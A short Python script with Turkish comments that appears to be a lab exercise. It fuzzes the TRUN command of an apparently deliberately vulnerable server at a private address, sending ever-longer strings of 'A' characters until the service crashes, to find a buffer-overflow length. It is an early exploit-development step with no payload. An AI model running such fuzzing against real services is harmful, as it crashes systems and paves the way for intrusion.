import socket
from time import sleep
import sys
# karsi server a baglanti icin
# karsi server a bir string yollanacak ve x tane A /.:/ --> sistem alglasin diye
numberOfCharacters = 100
stringToSend = "TRUN /.:/" + "A" * 100

while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        bytes = stringToSend.encode(encoding="latin1")
        mySocket.send(bytes)
        mySocket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)

    except KeyboardInterrupt:
        print("Crashed at: " + str(len(stringToSend)))
        sys.exit()

    except Exception as e:
        print("Crashed at: " + str(len(stringToSend)))
        # tahmini hangi degerde coktu onu gorelim
        print(e)
        sys.exit()